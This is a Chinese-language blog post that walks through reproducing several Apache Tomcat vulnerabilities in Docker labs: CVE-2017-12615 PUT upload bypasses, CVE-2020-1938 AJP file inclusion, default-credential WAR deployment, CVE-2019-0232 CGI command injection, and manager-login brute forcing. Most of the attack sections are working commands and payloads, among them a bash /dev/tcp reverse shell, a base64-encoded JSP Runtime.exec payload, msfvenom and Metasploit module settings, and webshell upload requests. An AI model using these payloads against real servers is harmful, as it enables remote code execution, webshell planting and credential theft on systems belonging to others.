## 干货｜最全的Tomcat漏洞复现





# 简介

Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。

Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。

诀窍是，当配置正确时，Apache 为HTML页面服务，而Tomcat 实际上运行JSP 页面和Servlet。另外，Tomcat和IIS等Web服务器一样，具有处理HTML页面的功能，另外它还是一个Servlet和JSP容器，独立的Servlet容器是Tomcat的默认模式。不过，Tomcat处理静态HTML的能力不如Apache服务器。目前Tomcat最新版本为10.0.5。

# CVE-2017-12615

CVE-2017-12615对应的漏洞为任意文件写入，主要影响的是Tomcat的7.0.0-7.0.81这几个版本

## 漏洞原理

由于配置不当（非默认配置），将配置文件`conf/web.xml`中的`readonly`设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传

根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码

通过阅读 conf/web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控

## 漏洞复现

这里使用vuluhub的docker进行漏洞复现，这里就不详细介绍环境搭建了

首先进入CVE-2017-12615的docker环境

```
sudo docker-compose up -ddocker ps    //查看docker环境是否启动成功
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw1aIUrUicCrCXZRCuWZNQObMUsyCLwV0wYQYkqicfgvJwwgSxvuHtibVPQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这里首先进入docker里查看一下`web.xml`的代码，可以看到这里`readonly`设置为`false`，所以存在漏洞

```
sudo docker exec -ti ec bash    //进入docker容器cat conf/web.xml | grep readonly
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwxDG7fx4ZM2LZkvwDMUShuUJsO6L7AaTSzj9yCYiakOsUOLoN1PiaT4IQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

访问下8080端口，对应的是`Tomcat 8.5.19`

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwbP2VLn2z8Jx6MbROH7sPeO7erTbJP2LwmVjGKotDXC9ia2D4QC1icfmQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

在8080端口进行抓包，这里发现是一个`GET`方法

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里首先测试一下，改为`PUT`方法写入一个`test.txt`，这里看到返回201，应该已经上传成功了

```
PUT /test.txt HTTP/1.1testpoc
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwNm12UsVhJFmTIbvSr1DWVlA6mgN2Y7Vib66M65tJ262ONAv9wY1RpPg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这里进入docker查看一下已经写入成功了

```
cd /usr/local/tomcat/webapps/ROOTls
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwFJ84N3Svdt3iaSnONPZTSfyGM49XmNoYfibic92rd3NUyBRUPKZ29hphQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

之前说过，使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw37o4nP5976iaH9jgQXIpNl4CXWQzOuuIzqFlULVsOIeTSdVibJ6pVhaw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这里就需要进行绕过，这里绕过有三种方法

```
1.Windows下不允许文件以空格结尾以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格2.Windows NTFS流Put/a001.jsp::$DATA HTTP/1.13. /在文件名中是非法的，也会被去除（Linux/Windows）Put/a001.jsp/http:/1.1
```

首先使用`%20`绕过。我们知道`%20`对应的是空格，在windows中若文件这里在jsp后面添加`%20`即可达到自动抹去空格的效果。这里看到返回201已经上传成功了

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

进入docker查看一下，确认是上传上去了

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwOib3ocod1QIRrTpp9ORibBuVgVj6sQUs0t9PtBc356bOSz3k5GmQ5QOg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

第二种方法为在jsp后缀后面使用`/`，因为`/`在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传`/ice1.jsp/`，看到返回201

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwtkqkbW5PNEOfnccFb3YcDfuF5QoaWNXhllNsicZHRFKOxS4H1gRicjCg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

进入docker查看发现已经上传成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwAXPDkuY1DH1x6bH5zhibZK7vSXVfv8GBiajK5S7GzkZO1HqqcQ4H0qwA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

第三种方法就是使用Windows NTFS流，在jsp后面添加`::$DATA`，看到返回201，上传成功

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

进入docker验证一下

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里随便连接一个jsp即可拿到webshell

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwqVdGQS9ibLnseZrQLVlICfLWGJAkvc4MlVUIpg00ea36R7oGeGFX44g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

# CVE-2020-1938

CVE-2020-1938为Tomcat AJP文件包含漏洞。由长亭科技安全研究员发现的存在于 Tomcat中的安全漏洞，由于 Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取 webapp配置文件或源码。

此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

## 漏洞原理

Tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell

tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwTI94NkuqjgCY95pCZVYuHaJBibWLXz9QBURA9j9bXZWicswHDWPoCjrg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwmBtpTibccZaPbVQic7MBnbVr0tDspEwtt1funicCe0vmtfyDFKVyd0Jug/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

因此可以通过此种特性从而可以控制request对象的下面三个Attribute属性

```
javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path
```

然后封装成对应的request之后,继续走servlet的映射流程如下

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw50dLCeMeEQQiasbiaBXPfoicYFZLgEWQPIVoPrBVWCMSUIFrgBglBxM9w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

## 漏洞复现

启动CVE-2020-1938的docker环境

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

首先使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件

```
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lficd CNVD-2020-10487-Tomcat-Ajp-lfipython CNVD-2020-10487-Tomcat-Ajp-lfi.py    #py2环境
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里查看8009端口下的`web.xml`文件

```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f /WEB-INF/web.xml
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwLMHZmN8U3lia8EsBtSEibpKXykgElQzPMeJaGR5CJUyzicDQao6crmUpQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

使用bash反弹shell

```
bash -i >& /dev/tcp/192.168.1.8/8888 0>&1
```

因为是java的原因所以需要转换一下，使用http://www.jackson-t.ca/runtime-exec-payloads.html，转换结果如下

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
```

生成一个`test.txt`，这里只需要换payload就可以

```
<%    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}").getInputStream();    int a = -1;    byte[] b = new byte[2048];    out.print("<pre>");    while((a=in.read(b))!=-1){        out.println(new String(b));    }    out.print("</pre>");%>
```

bp抓包把`test.txt`上传到docker容器

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

nc开启端口监听

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

即可获得一个交互型shell

```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f test.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里为了方便，上线到msf上进行操作，首先生成一个`shell.txt`

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 R > shell.txt
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwDE4o1Y4ZpSl6Qm8EvKonDbjWBkBHiafspicZowoH39movsRGFNK9UjTA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

抓包将`shell.txt`上传到docker

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwlkdLibTyiaCyF8vtqGoUHMlz7hlxMSh7PYfM6o5Tl8CDm6CYWoYWBRLg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

msf开启监听，注意payload使用`java/jsp_shell_reverse_tcp`

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwcIzs6U0QJjf2tibUPekGGXic3bMVgQYtMWPaCgCkzbhtSrTfsibjquvNQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

再使用poc反弹即可上线

```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f shell.txt
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwSWphHmJnN7zQYKyfNsibTuSibbr1HTTJV3YIIKZdVH4dvwHocybcHYtw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

# 弱口令&war远程部署

## 漏洞原理

在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台

## 漏洞复现

进入`tomcat8`的docker环境

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问后台管理地址，使用tomcat/tomcat进入后台

```
http://192.168.1.8:8080//manager/html
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwxx6SicTkovVAYz2QdxicYVPgSiagkfGrjQUZMXGXia0vAGoym1AAnvibaiag/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

进入到了后台的页面

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNws7HAUWZ6fWuzicBpQE5VoPrTYFtYygbiag0vgaHTQaw83jnJ9FTibkW4Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwFdibdPdFEXTpRYFicgGiaevB6qIcnNvnRy1QLiaiaKUbumJdylJP6oJMdMg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

首先将ice.jsp打包成test.war

```
jar -cvf test.war .
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

点击上传即可看到上传的test.war已经部署成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw9bQyG8kGpvWmROZeUwlSpM8cfjszLT2wyUTZ9lNdQRGECkNBSsvWyQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

访问一下没有报错404那么应该已经上传成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwS7JNNezsibLvs1DLR3L5YW7nvzjibRu9a8oIVcy5gg4oYVJ9GHAqMFPg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

使用冰蝎连接即可得到shell

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwf6H8XW9kqgQ1Yw01jhtwOdLtxicId6E7o9nMx858DUk6mP6s3LY1OWQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这里也可以用msf里面的`exploit/multi/http/tomcat_mgr_upload `模块

```
use exploit/multi/http/tomcat_mgr_uploadset HttpPassword tomcatset HttpUsername tomcatset rhost 192.168.1.8set rport 8080run
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

运行即可得到一个meterpreter

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

# CVE-2019-0232

CVE-2019-0232为Apache Tomcat RCE

## 漏洞原理

漏洞相关的代码在 tomcat\java\org\apache\catalina\servlets\CGIServlet.java 中，CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。这个漏洞是因为 Runtime.getRuntime().exec 在Windows中和Linux中底层实现不同导致的

Java的 `Runtime.getRuntime().exec` 在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是 `CreateProcess` ，会将参数合并成字符串，作为 `lpComandLine` 传入 `CreateProcess` 。程序启动后调用 `GetCommandLine` 获取参数，并调用 `CommandLineToArgvW` 传至 argv。在Windows中，当 `CreateProcess` 中的参数为 bat 文件或是 cmd 文件时，会调用 `cmd.exe` , 故最后会变成 `cmd.exe /c "arg.bat & dir"`，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞

## 漏洞复现

启动tomcat

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNww8BC5UpJSHwyiaib7tsibn8PZmez7njgqZhQboH9ElaHmDmrIwChpggBA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

访问一下已经启动成功

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Tomcat的 CGI_Servlet组件默认是关闭的，在`conf/web.xml`中找到注释的 CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw02JqwgvUicb0Z91USKfCHlaKG91icFF3QqNibWc0vsmECVgvcc4Y1jflg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这里注意一下，去掉注释并添加以下代码

```
enableCmdLineArguments启用后才会将Url中的参数传递到命令行executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。
    <init-param>        <param-name>enableCmdLineArguments</param-name>        <param-value>true</param-value>    </init-param>    <init-param>        <param-name>executable</param-name>        <param-value></param-value>    </init-param>
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwMUHKroEz574ImLTWWCykMepF8YaLoQzwFAqFQvz4Sbc5Gbo3hicf4sQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

然后在conf/web.xml中启用cgi的 servlet-mapping

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

修改conf/context.xml的添加 privileged="true"属性，否则会没有权限

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

添加true

```
<Context privileged="true">
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwz7CUFyvDD3KbmWpbR1icVEF2WpEUpxz1WVpyMugIyjia1bZ6jKibx9bIA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

在`C:\Tomcat\webapps\ROOT\WEB-INF`下创建`cgi-bin`目录

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwG9r3Klc1t7E6QRkSVk6Eo9XATuVUEeiaUY0cXqEzn6EpJPKLUcxO8Hg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

在该目录下创建一个hello.bat

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后重启tomcat环境

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问`http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe`即可弹出计算器，这里构造系统命令即可

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwWxibaJzBtYHQuPXJx68lv2thFqCmxc9ibrD58vTVWQMfyh4dQyZJXnIw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

# manager App暴力破解

## 漏洞原理

后台密码用base64编码传输，抓包解密即可得到后台密码，也可以进行爆破

## 漏洞复现

这里访问`http://192.168.1.8:8000/manager/html`进行抓包，在没有输入帐号密码的时候是没有什么数据的

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

把这个包放过去，会请求输入用户名和密码，再进行抓包

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

就可以得到`Authorization`这个字段，这个字段有一个`Basic`，就是base64加密的意思

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里直接放到base64解密得到`tomcat:tomcat`的密码

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

进入后台之后再次抓包可以看到有一个cookie，但是没有了`Authorization`这个字段

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwVF6uibFM3XtKGc5mDq2wGKXTBhzqTTmLK2VXxWmxZ7eanibwXibmQibp6g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

我们可以对字段进行爆破，加上`Authorization`即可

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwJzRVoVyR98jg6ntJ79RBpVUbXUsdwh990uWNJakHjPACWCjRNtHXrQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

去掉自带的编码

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwcXpcHPt8aqia7eicOOxmqYDmbfib4dwZXLLubaodv58IelCSZrnNpqicicQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

攻击即可拿到账号密码

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwDfJ55POtD254ic58ia5Jnv8x5BiciaFkqVjKJcic3m5ZU4TAYPxjBFPwA1g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

